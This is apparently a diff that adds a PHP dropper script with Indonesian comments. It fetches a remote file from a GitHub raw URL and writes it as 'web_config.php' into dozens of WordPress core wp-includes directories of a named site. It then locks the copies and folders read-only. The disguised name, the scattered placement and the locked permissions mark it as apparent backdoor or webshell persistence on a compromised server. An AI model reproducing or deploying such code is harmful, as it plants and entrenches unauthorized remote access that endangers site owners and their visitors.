@@ -1,0 +1,129 @@
+<?php
+
+function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
+    $options = [
+        'http' => [
+            'header' => "User-Agent: Mozilla/5.0\r\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    // Pastikan semua folder ada
+    foreach ($save_dirs as $dir) {
+        if (!is_dir($dir)) {
+            echo "📂 Folder '$dir' belum ada. Mencoba membuat...\n";
+            if (!mkdir($dir, 0777, true)) {
+                echo "❌ Gagal membuat folder: $dir\n";
+                continue;
+            }
+            echo "✅ Folder '$dir' berhasil dibuat.\n";
+        } else {
+            echo "📁 Folder '$dir' sudah ada.\n";
+        }
+    }
+
+    // Proses download dan simpan
+    foreach ($files as $file) {
+        $url = $file['url'];
+        echo "⬇️  Downloading: $url\n";
+
+        $content = @file_get_contents($url, false, $context);
+        if ($content === false) {
+            echo "❌ Gagal download dari $url\n";
+            continue;
+        }
+
+        foreach ($save_dirs as $dir) {
+            // gunakan nama sesuai 'save_name', fallback ke basename URL
+            $save_name = $file['save_name'] ?? basename($url); 
+            $save_path = rtrim($dir, '/') . '/' . $save_name;
+
+            if (file_put_contents($save_path, $content) !== false) {
+                echo "✅ File disimpan ke: $save_path\n";
+                chmod($save_path, 0444);
+            } else {
+                echo "❌ Gagal simpan file ke: $save_path\n";
+            }
+        }
+    }
+
+    // Set permission folder
+    foreach ($save_dirs as $dir) {
+        chmod($dir, 0555);
+        echo "🔧 Permission folder '$dir' di-set ke 0555\n";
+    }
+}
+
+$files_to_download = [
+    [
+        'url' => 'https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/bcalfa',
+        'save_name' => 'web_config.php'  // nama files
+    ],
+];
+
+// direcory DIR
+$save_directories = [
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/archives/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/audio/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/avatar/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/button/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/calendar/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/categories/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/code/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/columns/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/cover/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/embed/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/file/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/gallery/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/group/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/heading/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/html/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/image/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/latest-comments/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/latest-posts/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/list/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/media-text/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/navigation/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/paragraph/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/preformatted/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/pullquote/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/quote/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/rss/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/search/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/separator/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/site-logo/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/site-title/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/social-links/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/spacer/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/table/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/tag-cloud/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/text-columns/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/verse/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/blocks/video/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/cache/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/certificates/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/compat/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/customize/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/fonts/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/http/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/js/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/js/tinymce/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/js/tinymce/langs/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/js/tinymce/plugins/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/pomo/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/random_compat/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/random_compat/lib/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/Requests/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/Requests/Cookie/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/Requests/Exception/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/Requests/Transport/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/SimplePie/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/SimplePie/Cache/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/SimplePie/Parser/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/sodium_compat/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/sodium_compat/lib/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/theme-compat/',
+    '/home3/wasiq/creative-publishinghouse.com/wp-includes/widgets/'
+];
+
+download_and_save_to_multiple_dirs($files_to_download, $save_directories);
